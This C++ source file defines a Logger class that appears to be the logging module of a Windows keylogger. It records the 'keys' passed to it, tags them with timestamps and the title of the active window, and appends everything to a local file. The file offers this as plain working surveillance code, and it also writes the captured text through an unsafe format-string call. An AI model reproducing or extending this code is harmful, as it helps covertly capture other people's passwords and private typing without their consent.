/**
 * Copyright (c) 2013, Dan
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met: 
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer. 
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution. 
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include "logger.h"

char *Logger::last_title = NULL, *Logger::last_timestamp = NULL;

int Logger::get_timestamp(char *dest, int len) {
	memset(dest, 0, len);
	time_t rawtime;
	struct tm *timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	strftime(dest, len, TIMESTAMP_FORMAT, timeinfo);
	return len;
}

int Logger::get_title(char *&dest, int len) {
	HWND hwnd = GetForegroundWindow();
	if (dest == NULL) {
		len = GetWindowTextLength(hwnd) + 1;
		dest = (char*) malloc(sizeof(char) * len);
	}
	memset(dest, 0, sizeof(char) * len);
	GetWindowText(hwnd, dest, len);
	return len;
}

void Logger::log(char *keys) {
	FILE *logFile = fopen(LOG_FILE, "a");
	if (logFile != NULL) {
		char *timestamp = (char*) malloc(sizeof(char) * MAX_TIMESTAMP), *title = NULL;
		get_timestamp(timestamp, MAX_TIMESTAMP);
		get_title(title, 0);
		// Updating title.
		bool update = (last_title == NULL) ? true : ((strcmp(last_title, title) != 0) ? true : false);
		if (update) {
			free(last_title);
			last_title = title;
			fprintf(logFile, "\n[%s]", last_title);
			//printf("\n[%s]", last_title); // XXX
		} else {
			free(title);
		}
		// Updating timestamp.
		if (!update) {
			update = (last_timestamp == NULL) ? true : ((strcmp(last_timestamp, timestamp) != 0) ? true : false);
		}
		if (update) {
			free(last_timestamp);
			last_timestamp = timestamp;
			fprintf(logFile, "\n%s: ", last_timestamp);
			//printf("\n%s: ", last_timestamp); // XXX
		} else {
			free(timestamp);
		}
		fprintf(logFile, keys);
		//printf(keys); // XXX
		fclose(logFile);
	}
}